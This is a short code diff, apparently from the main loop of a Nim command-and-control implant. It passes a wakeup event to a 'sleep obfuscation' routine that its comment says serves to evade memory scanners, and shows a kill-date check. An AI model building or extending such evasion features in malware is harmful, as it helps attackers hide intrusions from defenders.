@@ -29,7 +29,7 @@ proc agentMain() =
         try: 
             # Sleep obfuscation to evade memory scanners
             print ""
-            sleepObfuscate(ctx.sleepSettings)
+            sleepObfuscate(ctx.sleepSettings, ctx.hWakeupEvent)
 
             # Check kill date and exit the agent process if it is reached
             if ctx.killDate != 0 and now().toTime().toUnix().int64 >= ctx.killDate: 
